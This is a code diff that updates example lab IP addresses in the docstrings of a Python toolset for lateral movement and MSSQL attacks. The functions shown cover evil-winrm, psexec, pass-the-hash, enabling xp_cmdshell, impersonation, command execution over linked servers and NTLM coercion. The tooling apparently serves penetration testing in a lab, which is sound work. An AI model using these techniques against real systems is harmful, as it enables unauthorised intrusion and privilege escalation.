@@ -112,8 +112,8 @@ class LateralMovementTools(Toolset):
             Command output or session status
 
         Example:
-            >>> evil_winrm("192.168.56.22", "admin", password="pass")  # pragma: allowlist secret
-            >>> evil_winrm("192.168.56.22", "admin", hash="aad3b435...")
+            >>> evil_winrm("192.168.58.22", "admin", password="pass")  # pragma: allowlist secret
+            >>> evil_winrm("192.168.58.22", "admin", hash="aad3b435...")
         """
         if not (password or hash):
             return "[!] Error: Either password or hash must be provided"
@@ -187,7 +187,7 @@ class LateralMovementTools(Toolset):
             Command output
 
         Example:
-            >>> psexec("192.168.56.22", "admin", password="pass", command="whoami")  # pragma: allowlist secret
+            >>> psexec("192.168.58.22", "admin", password="pass", command="whoami")  # pragma: allowlist secret
         """
         resolved_password = self._resolve_password(username, domain, password)
         if (
@@ -783,7 +783,7 @@ class MSSQLTools(Toolset):
             Command output from the target system
 
         Example:
-            >>> mssql_command("192.168.56.22", "sa", "password", "whoami", windows_auth=False)  # pragma: allowlist secret
+            >>> mssql_command("192.168.58.22", "sa", "password", "whoami", windows_auth=False)  # pragma: allowlist secret
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -829,7 +829,7 @@ class MSSQLTools(Toolset):
             xp_cmdshell enablement result
 
         Example:
-            >>> mssql_enable_xp_cmdshell("192.168.56.22", "user", "pass", "domain.local")
+            >>> mssql_enable_xp_cmdshell("192.168.58.22", "user", "pass", "domain.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -892,7 +892,7 @@ RECONFIGURE;
             List of users that can be impersonated
 
         Example:
-            >>> mssql_enum_impersonation("192.168.56.22", "user", "pass", "domain.local")
+            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "domain.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -972,8 +972,8 @@ WHERE a.permission_name = 'IMPERSONATE';
             Query result executed as the impersonated user
 
         Example:
-            >>> mssql_enum_impersonation("192.168.56.22", "user", "pass", "domain.local")  # First enumerate
-            >>> mssql_impersonate("192.168.56.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "domain.local")
+            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "domain.local")  # First enumerate
+            >>> mssql_impersonate("192.168.58.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "domain.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1031,7 +1031,7 @@ WHERE a.permission_name = 'IMPERSONATE';
             List of linked servers with access information
 
         Example:
-            >>> mssql_enum_linked_servers("192.168.56.22", "user", "pass", "domain.local")
+            >>> mssql_enum_linked_servers("192.168.58.22", "user", "pass", "domain.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1096,8 +1096,8 @@ EXEC sp_linkedservers;
             Query result from the linked server
 
         Example:
-            >>> mssql_exec_linked("192.168.56.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "domain.local")
-            >>> mssql_exec_linked("192.168.56.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "domain.local")
+            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "domain.local")
+            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "domain.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1158,7 +1158,7 @@ EXEC sp_linkedservers;
             Coercion attempt result
 
         Example:
-            >>> mssql_ntlm_coerce("192.168.56.22", "user", "pass", "192.168.56.100", "domain.local")
+            >>> mssql_ntlm_coerce("192.168.58.22", "user", "pass", "192.168.58.100", "domain.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
